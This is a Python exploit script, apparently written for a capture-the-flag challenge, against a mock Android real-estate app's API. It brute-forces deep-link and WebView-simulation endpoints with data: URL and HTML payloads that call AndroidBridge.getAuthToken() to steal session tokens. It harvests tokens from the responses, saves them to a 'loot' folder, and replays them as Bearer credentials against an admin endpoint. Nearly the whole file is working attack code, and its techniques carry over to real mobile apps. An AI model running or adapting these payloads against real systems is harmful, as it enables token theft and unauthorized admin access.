#!/usr/bin/env python3
import json
import re
import sys
from pathlib import Path
from urllib.parse import quote

import requests
from urllib3.exceptions import InsecureRequestWarning

# Desativa warnings TLS comuns em CTF.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

TARGET_HOST = "87e6bb1481310f67.chal.ctf.ae"
BASE = f"https://{TARGET_HOST}"

Path("loot").mkdir(exist_ok=True)

# Headers do app Android decompilado.
HEADERS = {
    "X-App-Version": "3.7.2",
    "X-Platform": "android",
    "User-Agent": "FluidRealty/3.7.2 Android WebView",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
}

FOUND_TOKENS = set()


def pretty(text):
    """
    Formata JSON quando possível.
    """
    try:
        return json.dumps(json.loads(text), indent=2, ensure_ascii=False)
    except Exception:
        return text


def save_response(label, response):
    """
    Salva resposta completa para documentação/writeup.
    """
    safe = re.sub(r"[^a-zA-Z0-9_.-]+", "_", label).strip("_")
    path = Path("loot") / f"script3_{safe}.txt"

    lines = []
    lines.append(f"URL: {response.url}")
    lines.append(f"STATUS: {response.status_code}")
    lines.append("")
    lines.append("HEADERS:")
    for k, v in response.headers.items():
        lines.append(f"{k}: {v}")
    lines.append("")
    lines.append("BODY:")
    lines.append(pretty(response.text))

    path.write_text("\n".join(lines), encoding="utf-8")
    return path


def extract_interesting(body):
    """
    Procura flag e possíveis tokens no corpo da resposta.
    """
    # Flag padrão do CTF.
    flag = re.search(r"flag\{[^}\r\n]+\}", body, re.IGNORECASE)
    if flag:
        print()
        print("=" * 100)
        print("[+] FLAG ENCONTRADA")
        print("=" * 100)
        print(flag.group(0))
        Path("flag.txt").write_text(flag.group(0) + "\n", encoding="utf-8")
        print("[+] Flag salva em flag.txt")
        sys.exit(0)

    # Campos JSON comuns que podem carregar token.
    token_patterns = [
        r'"token"\s*:\s*"([^"]+)"',
        r'"authToken"\s*:\s*"([^"]+)"',
        r'"auth_token"\s*:\s*"([^"]+)"',
        r'"session_token"\s*:\s*"([^"]+)"',
        r'"access_token"\s*:\s*"([^"]+)"',
        r'Bearer\s+([A-Za-z0-9._~+/=-]+)',
    ]

    for pattern in token_patterns:
        for match in re.finditer(pattern, body, re.IGNORECASE):
            token = match.group(1).strip()
            if token and token.lower() not in ["null", "undefined", "none"]:
                FOUND_TOKENS.add(token)


def should_print(response):
    """
    Imprime respostas úteis e evita ruído de 404 vazio.
    """
    body = response.text.lower()

    if response.status_code in [200, 201, 202, 400, 401, 403, 422, 500]:
        return True

    keywords = [
        "flag",
        "token",
        "auth",
        "private",
        "admin",
        "webview",
        "deeplink",
        "androidbridge",
        "javascript",
        "url",
        "error",
    ]

    return any(k in body for k in keywords)


def request(label, method, path, params=None, json_body=None):
    """
    Executa requisição e processa a resposta.
    """
    try:
        response = requests.request(
            method,
            BASE + path,
            headers=HEADERS,
            params=params,
            json=json_body,
            timeout=12,
            verify=False,
            allow_redirects=False,
        )
    except requests.RequestException as exc:
        print()
        print("=" * 100)
        print(label)
        print("=" * 100)
        print(f"Erro: {exc}")
        return None

    saved = save_response(label, response)
    extract_interesting(response.text)

    if should_print(response):
        print()
        print("=" * 100)
        print(label)
        print("=" * 100)
        print(f"URL: {response.url}")
        print(f"Status: {response.status_code}")
        print(f"Tamanho: {len(response.text)} bytes")
        print(f"Salvo em: {saved}")
        print()

        preview = pretty(response.text)
        if len(preview) > 1800:
            preview = preview[:1800] + "\n...[preview cortado, resposta completa em loot]"
        print(preview)

    return response


def test_deeplink_process():
    """
    Testa o endpoint /api/deeplink/process com os formatos prováveis.

    O código Java aceita:
    fluidrealty://view?url=<url_controlada>
    fluidrealty://property?id=<id>
    fluidrealty://search?q=<query>
    """
    print("[*] Testando /api/deeplink/process")

    # Payload HTML que tenta chamar a bridge nativa do Android.
    js_bridge_html = """
    <html>
      <body>
        <script>
          try {
            document.body.innerText = AndroidBridge.getAuthToken();
          } catch (e) {
            document.body.innerText = "ERR:" + e.toString();
          }
        </script>
      </body>
    </html>
    """.strip()

    data_url_bridge = "data:text/html," + quote(js_bridge_html)

    deep_links = [
        "fluidrealty://property?id=1",
        "fluidrealty://property?id=5",
        "fluidrealty://property?id=6",
        "fluidrealty://property?id=7",
        "fluidrealty://search?q=flag",
        "fluidrealty://search?q=private",
        "fluidrealty://search?q=admin",
        "fluidrealty://view?url=https://app.fluidrealty.co/mobile/home",
        "fluidrealty://view?url=https://api.fluidrealty.co/api/properties/admin",
        "fluidrealty://view?url=" + quote(data_url_bridge, safe=""),
    ]

    query_param_names = ["url", "uri", "link", "deeplink", "deep_link"]

    json_field_names = ["url", "uri", "link", "deeplink", "deep_link"]

    for deep_link in deep_links:
        # GET com nomes de parâmetro diferentes.
        for param_name in query_param_names:
            request(
                f"DEEPLINK GET param={param_name} value={deep_link}",
                "GET",
                "/api/deeplink/process",
                params={param_name: deep_link},
            )

        # POST JSON com nomes de campo diferentes.
        for field_name in json_field_names:
            request(
                f"DEEPLINK POST field={field_name} value={deep_link}",
                "POST",
                "/api/deeplink/process",
                json_body={field_name: deep_link},
            )


def test_webview_simulate():
    """
    Testa o endpoint /api/webview/simulate.

    A hipótese é que esse endpoint simula a WebView vulnerável do app.
    Se ele aceitar data: URL ou HTML direto, tentamos chamar AndroidBridge.getAuthToken().
    """
    print("[*] Testando /api/webview/simulate")

    html_payloads = [
        """
        <html>
          <body>
            <script>
              document.body.innerText = AndroidBridge.getAuthToken();
            </script>
          </body>
        </html>
        """,
        """
        <html>
          <body>
            <script>
              let token = AndroidBridge.getAuthToken();
              fetch('/api/properties/admin', {
                headers: {'Authorization': 'Bearer ' + token}
              }).then(r => r.text()).then(t => document.body.innerText = t);
            </script>
          </body>
        </html>
        """,
        """
        <html>
          <body>
            <script>
              document.body.innerText =
                'token=' + AndroidBridge.getAuthToken() +
                '&device=' + AndroidBridge.getDeviceId() +
                '&version=' + AndroidBridge.getAppVersion();
            </script>
          </body>
        </html>
        """,
    ]

    urls = [
        "https://app.fluidrealty.co/mobile/home",
        "https://api.fluidrealty.co/api/properties",
        "https://api.fluidrealty.co/api/properties/admin",
    ]

    for html in html_payloads:
        compact_html = " ".join(line.strip() for line in html.strip().splitlines())
        urls.append("data:text/html," + quote(compact_html))

    query_param_names = ["url", "load_url", "target", "page"]

    json_field_names = ["url", "load_url", "target", "page", "html"]

    for url in urls:
        # GET com URL como parâmetro.
        for param_name in query_param_names:
            request(
                f"WEBVIEW GET param={param_name} value={url[:80]}",
                "GET",
                "/api/webview/simulate",
                params={param_name: url},
            )

        # POST JSON com URL/HTML como campo.
        for field_name in json_field_names:
            value = url

            # Se o campo for html, mandamos HTML puro em vez de data URL quando possível.
            if field_name == "html" and url.startswith("data:text/html,"):
                value = url.split(",", 1)[1]

            request(
                f"WEBVIEW POST field={field_name} value={url[:80]}",
                "POST",
                "/api/webview/simulate",
                json_body={field_name: value},
            )


def test_admin_with_found_tokens():
    """
    Caso algum endpoint devolva token, usa o token em /api/properties/admin.
    """
    if not FOUND_TOKENS:
        print("[*] Nenhum token extraído ainda.")
        return

    print()
    print("=" * 100)
    print("[*] Testando tokens encontrados no endpoint admin")
    print("=" * 100)

    for token in sorted(FOUND_TOKENS):
        print(f"[*] Token candidato: {token[:80]}")
        request(
            f"ADMIN WITH FOUND TOKEN {token[:40]}",
            "GET",
            "/api/properties/admin",
            json_body=None,
            params=None,
        )

        # Requisição manual porque request() usa HEADERS base sem Authorization.
        try:
            response = requests.get(
                BASE + "/api/properties/admin",
                headers={**HEADERS, "Authorization": f"Bearer {token}"},
                timeout=12,
                verify=False,
                allow_redirects=False,
            )
            saved = save_response(f"ADMIN_AUTH_{token[:40]}", response)
            extract_interesting(response.text)

            print()
            print("=" * 100)
            print(f"ADMIN AUTH token={token[:80]}")
            print("=" * 100)
            print(f"Status: {response.status_code}")
            print(f"Tamanho: {len(response.text)} bytes")
            print(f"Salvo em: {saved}")
            print()
            print(pretty(response.text))
        except requests.RequestException as exc:
            print(f"[!] Erro testando token: {exc}")


def main():
    print("[*] Script 3: exploração focada em deep link e WebView")
    print(f"[*] Target: {BASE}")

    test_deeplink_process()
    test_webview_simulate()
    test_admin_with_found_tokens()

    print()
    print("=" * 100)
    print("RESULTADO")
    print("=" * 100)
    print("[-] Flag não encontrada automaticamente neste script.")
    print("[*] Rode este grep para revisar respostas salvas:")
    print("grep -RniE 'flag|token|auth|private|admin|AndroidBridge|webview|deeplink|error' loot/script3_*.txt")

if __name__ == "__main__":
    main()
